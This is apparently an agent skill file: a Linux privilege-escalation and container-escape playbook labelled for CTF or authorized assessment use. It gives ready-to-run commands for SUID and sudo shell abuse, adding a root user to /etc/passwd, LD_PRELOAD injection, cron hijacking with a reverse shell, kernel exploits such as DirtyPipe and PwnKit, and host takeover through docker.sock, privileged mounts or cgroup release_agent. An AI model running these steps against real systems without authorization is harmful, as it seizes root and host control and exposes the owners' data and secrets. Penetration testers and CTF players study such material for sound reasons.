name: linux-privesc
description: Linux privilege escalation + container escape playbook. From a low-priv shell, enumerate the fastest win (sudo -l, SUID, capabilities, cron, writable files, kernel version), then escalate via GTFOBins SUID abuse, LD_PRELOAD, cron hijack, or a kernel exploit. If inside a container, detect it and escape via privileged mode, docker.sock, or cgroup release_agent. Use when you have shell but need root/host.
---

# Linux Privilege Escalation & Container Escape

Authorized CTF/assessment use. You have a shell — now get root (or escape the container to the host). Run the enumeration checklist FIRST, then pursue the fastest confirmed win; don't cycle techniques blindly.

## 1. Enumeration (run all, fast)

```bash
id; whoami; hostname; uname -a; cat /etc/os-release
sudo -l                       # ← the single biggest win if NOPASSWD anything
find / -perm -4000 -type f 2>/dev/null      # SUID binaries
getcap -r / 2>/dev/null                      # file capabilities
cat /etc/crontab; ls -la /etc/cron*          # cron jobs
ls -la /etc/passwd /etc/shadow               # writable?
find / -writable -type f 2>/dev/null | grep -v proc | head
env; cat /proc/1/cgroup                       # env creds + container check
```

## 2. Fastest wins (in order)

**sudo -l gives a NOPASSWD command** → GTFOBins it. Classic: `sudo vim` → `:!sh`; `sudo find` → `sudo find . -exec /bin/sh \;`; `sudo awk` → `sudo awk 'BEGIN{system("/bin/sh")}'`.

**SUID binary** → check GTFOBins for that exact binary (vim, find, python, bash, cp, tar, less, more, ...). A SUID `bash -p`, `python -c 'import os;os.setuid(0);os.system("/bin/sh")'`, or `cp /bin/sh /tmp/x && chmod u+s` wins.

**Writable /etc/passwd** → append a root user:
```
echo 'root2:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
# or with openssl: openssl passwd -1 -salt x password
su root2
```

**Capabilities:** `cap_setuid` → `python -c 'os.setuid(0);os.system("sh")'`; `cap_chown`/`cap_dac_read_search` → read /etc/shadow; `cap_sys_ptrace` → inject into a root process.

**Cron running as root + writable script** → overwrite the script with a reverse shell / `cp /bin/bash /tmp/b && chmod u+s /tmp/b`.

**LD_PRELOAD** (when a root process loads libs you can write): compile a `.so` with `__attribute__((constructor))` that does `setuid(0); system("/bin/sh");`, export `LD_PRELOAD`, trigger the process.

**Kernel exploit:** `uname -r` → match a known LPE (DirtyPipe CVE-2022-0847, DirtyCow CVE-2016-5195, OverlayFS CVE-2021-3493, PwnKit CVE-2021-4034). DirtyPipe and PwnKit are the highest-hit in CTFs — try those first.

## 3. Container detection & escape

**Am I in a container?**
```bash
cat /proc/1/cgroup | grep -qi 'docker\|kubepods\|containerd'
ls -la /.dockerenv            # exists = docker container
hostname                       # random hex = likely container
```

**Escape paths (in order of likelihood):**
- **docker.sock mounted** → `docker ps`, then `docker run -v /:/host -it alpine chroot /host sh` (full host root).
- **privileged container** → mount host disk: `fdisk -l` to find the host device, `mkdir /mnt; mount /dev/<host-root> /mnt; chroot /mnt sh`.
- **cgroup release_agent** (when writable cgroup + notify_on_release): write a release_agent script that runs on host, trigger it.
- **capabilities:** `cap_sys_admin` + mount, `cap_sys_module` → kernel module, `cap_sys_ptrace` → inject host process.
- **host mounts:** `mount | grep -v overlay` → any host dir mounted? Read `/flag` / host secrets directly.

## Cross-cutting
- **Enumeration decides the technique** — `sudo -l` and the SUID list are 90% of the answer; don't skip them for a "cooler" kernel exploit.
- **Kernel exploits are the last resort** (unstable, may crash) — only after misconfig paths are exhausted.
- Self-verify: after each attempt, `id` must show `uid=0` (or host shell) before claiming root.
